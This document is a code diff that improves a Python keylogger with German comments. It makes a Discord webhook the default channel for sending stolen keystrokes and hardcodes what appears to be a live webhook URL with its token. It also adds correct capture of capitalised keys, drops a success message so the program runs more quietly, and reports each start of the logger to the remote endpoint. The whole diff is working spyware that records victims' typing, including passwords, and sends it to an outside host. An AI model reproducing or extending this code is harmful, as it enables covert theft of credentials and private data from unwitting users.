@@ -11,7 +11,7 @@ EMAIL_PASSWORD = "dein-app-passwort"  # Ersetze mit deinem Gmail-App-Passwort (n
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"  # Ersetze mit deiner Webhook-URL
 
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval, report_method="discord"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
@@ -43,6 +43,12 @@ class Keylogger:
                 # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
+        else:
+            # normal character, check for shift to get correct case
+            if 'shift' in event.modifiers:
+                name = name.upper()
+            else:
+                name = name.lower()
         # finally, add the key name to our global `self.log` variable
         self.log += name
 
@@ -77,7 +83,6 @@ class Keylogger:
         data = {"content": message}
         try:
             requests.post(DISCORD_WEBHOOK_URL, json=data)
-            print("[+] Sent to Discord Webhook")
         except Exception as e:
             print(f"[-] Failed to send to Discord Webhook: {e}")
 
@@ -87,20 +92,24 @@ class Keylogger:
         It basically sends keylogs and resets `self.log` variable
         """
         if self.log:
+            #Log zwischenspeichern
+            current_log = self.log
+            #Log zurücksetzen
+            self.log = ""
             # if there is something in log, report it
             self.end_dt = datetime.now()
             # update `self.filename`
             self.update_filename()
             if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log.encode('ascii', 'ignore').decode('ascii'))
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, current_log.encode('ascii', 'ignore').decode('ascii'))
             elif self.report_method == "file":
                 self.report_to_file()
             elif self.report_method == "discord":
-                self.send_to_discord_webhook(self.log)
+                self.send_to_discord_webhook(current_log)
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
-        self.log = ""
+
         timer = Timer(interval=self.interval, function=self.report)
         # set the thread as daemon (dies when main thread die)
         timer.daemon = True
@@ -110,6 +119,15 @@ class Keylogger:
     def start(self):
         # record the start datetime
         self.start_dt = datetime.now()
+        #Sende eine Startmeldung
+        start_message = f"[started - {self.start_dt}]"
+        if self.report_method == "email":
+            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, start_message)
+        elif self.report_method == "file":
+            with open(f"start-{self.start_dt.strftime('%Y%m%d-%H%M%S')}.txt", "w") as f:
+                print(start_message, file=f)
+        elif self.report_method == "discord":
+            self.send_to_discord_webhook(start_message)
         # start the keylogger
         keyboard.on_release(callback=self.callback)
         # start reporting the keylogs
